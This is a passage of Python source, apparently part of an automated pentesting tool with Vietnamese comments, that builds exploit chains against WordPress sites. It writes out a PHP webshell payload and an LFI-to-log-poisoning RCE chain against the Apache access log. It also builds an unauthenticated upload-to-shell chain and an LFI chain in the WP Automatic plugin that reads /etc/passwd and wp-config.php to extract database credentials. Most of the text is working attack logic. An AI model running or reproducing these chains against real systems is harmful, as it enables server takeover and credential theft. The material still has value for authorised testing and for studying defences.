            prerequisites=["Auth vulnerability", "Admin endpoint"],
            steps=[
                ExploitStep(name="Bypass Auth", action="exploit_auth_bypass", target=vuln_url, tool="curl"),
                ExploitStep(name="Access Admin", action="enter_admin", target=admin_url, tool="curl", depends_on=["Bypass Auth"]),
            ]
        )

    def _build_lfi_log_poison_chain(self, vuln: Dict) -> ExploitChain:
        vuln_url = vuln.get("url", "")
        if not vuln_url.startswith(('http://', 'https://')):
            vuln_url = self._build_full_url(vuln_url)
        
        target_base = self._get_base_url()
        
        return ExploitChain(
            name="LFI → Log Poisoning → RCE",
            description="Use LFI to read logs, poison logs for RCE",
            risk_level="HIGH",
            estimated_time="15-45 min",
            prerequisites=["LFI vulnerability"],
            steps=[
                ExploitStep(name="Read Logs", action="read_log_file", target=vuln_url, tool="curl", payload="../../../../var/log/apache2/access.log"),
                ExploitStep(name="Poison Log", action="inject_log", target=target_base, tool="curl", payload="<?php system($_GET['cmd']); ?>"),
                ExploitStep(name="Execute RCE", action="trigger_rce", target=vuln_url, tool="curl", depends_on=["Poison Log"], payload="?file=../../../var/log/apache2/access.log&cmd=id"),
            ]
        )

    def _build_direct_upload_rce_chain(self, endpoint: Dict) -> ExploitChain:
        """
        Chain khai thác trực tiếp vuln-upload.php — không cần bypass filter.
        Lab này cho phép upload PHP trực tiếp, uploads/ có thể execute PHP.
        """
        upload_url = endpoint.get("url", "")
        if not upload_url.startswith(('http://', 'https://')):
            upload_url = self._build_full_url(upload_url)

        # Xác định base URL để build đường dẫn shell sau khi upload
        base = self._get_base_url()
        shell_url = f"{base}/wp-content/uploads/shell.php"

        return ExploitChain(
            name="Unauthenticated File Upload → Direct RCE",
            description="Upload PHP webshell trực tiếp qua endpoint không xác thực, execute lệnh qua uploads/",
            risk_level="CRITICAL",
            estimated_time="2-5 min",
            prerequisites=["vuln-upload.php accessible"],
            preconditions=["no authentication required", "uploads directory executable"],
            postconditions=["code_execution", "remote_shell"],
            steps=[
                ExploitStep(
                    name="Probe upload endpoint",
                    action="probe_endpoint",
                    target=upload_url,
                    tool="curl",
                    success_indicator="200",
                    priority=10,
                ),
                ExploitStep(
                    name="Upload PHP webshell",
                    action="upload_webshell",
                    target=upload_url,
                    tool="curl",
                    payload="<?php system($_GET['cmd']); ?>",
                    depends_on=["Probe upload endpoint"],
                    success_indicator="File uploaded successfully",
                    priority=9,
                ),
                ExploitStep(
                    name="Execute RCE via webshell",
                    action="trigger_webshell",
                    target=shell_url,
                    tool="curl",
                    payload="?cmd=id",
                    depends_on=["Upload PHP webshell"],
                    success_indicator="uid=",
                    priority=8,
                    postconditions=["code_execution"]
                ),
            ]
        )

    def _build_wp_automatic_lfi_chain(self, endpoint: Dict) -> ExploitChain:
        """
        Chain khai thác LFI trong WP Automatic plugin.
        Plugin dùng include($action) trực tiếp không validate.
        """
        base = self._get_base_url()
        plugin_url = f"{base}/wp-content/plugins/wp-automatic/wp-automatic.php"

        return ExploitChain(
            name="WP Automatic Plugin LFI → Config Disclosure",
            description="Khai thác Local File Inclusion trong WP Automatic để đọc wp-config.php và lấy DB credentials",
            risk_level="CRITICAL",
            estimated_time="2-5 min",
            prerequisites=["wp-automatic plugin installed"],
            preconditions=["no authentication required"],
            postconditions=["information_disclosure", "data_exfiltration"],
            steps=[
                ExploitStep(
                    name="Verify LFI via /etc/passwd",
                    action="test_lfi",
                    target=f"{plugin_url}?wp_automatic_action=/etc/passwd",
                    tool="curl",
                    success_indicator="root:x:",
                    priority=10,
                ),
                ExploitStep(
                    name="Read wp-config.php",
                    action="read_wp_config",
                    target=f"{plugin_url}?wp_automatic_action=/var/www/html/wp-config.php",
                    tool="curl",
                    depends_on=["Verify LFI via /etc/passwd"],
                    success_indicator="DB_PASSWORD",
                    priority=9,
                ),
                ExploitStep(
                    name="Extract DB credentials",
                    action="extract_credentials",
                    target=f"{plugin_url}?wp_automatic_action=/var/www/html/wp-config.php",
                    tool="curl",
                    depends_on=["Read wp-config.php"],
                    success_indicator="DB_USER",
                    priority=8,
                    postconditions=["information_disclosure"]
                ),
            ]
        )

    def format_chain_report(self, chains: List[ExploitChain]) -> str:
        """Format chains into readable report"""
        lines = [
            "=" * 60,
            "  EXPLOIT CHAIN ANALYSIS",
            "=" * 60,
            f"  {len(chains)} exploit chains identified",
            "",
        ]

        for i, chain in enumerate(chains, 1):
            lines.extend([
                f"[{i}] {chain.name}",
                f"    Risk Level : {chain.risk_level}",
                f"    Est. Time  : {chain.estimated_time}",
                f"    Steps      : {len(chain.steps)}",
                f"    Description: {chain.description}",
                "",
                "    STEPS:",
            ])
            for j, step in enumerate(chain.steps, 1):
                lines.append(f"    {j}. {step.name}")
                lines.append(f"       Action : {step.action}")
                if step.tool:
                    lines.append(f"       Tool   : {step.tool}")
                if step.payload:
                    lines.append(f"       Payload: {step.payload[:60]}")
                lines.append(f"       Success: {step.success_indicator}")
            lines.append("=" * 60)

        return "\n".join(lines)


# Restore legacy ChainPlanner helpers after introducing AIPoweredChainPlanner.
for _method_name in [
    "smart_prioritize",
    "_build_conditioned_wp_chains",
    "_calculate_impact_score",
    "_calculate_likelihood_score",
    "execute_chain",
    "_check_prerequisites",
    "_execute_step",
    "_build_wp_admin_chain",
    "_build_xmlrpc_chain",
    "_build_sqli_chain",
    "_build_upload_chain",
    "_build_direct_upload_rce_chain",
    "_build_wp_automatic_lfi_chain",
    "_build_lfi_chain",
    "_build_xss_chain",
    "_build_wp_plugin_chain",
    "combine_chains",
    "_chains_overlap",
    "_merge_chains",
    "_detect_chain_patterns",
    "_build_upload_admin_chain",
    "_build_auth_bypass_chain",
    "_build_lfi_log_poison_chain",
    "format_chain_report",
]:
    setattr(ChainPlanner, _method_name, getattr(AIPoweredChainPlanner, _method_name))
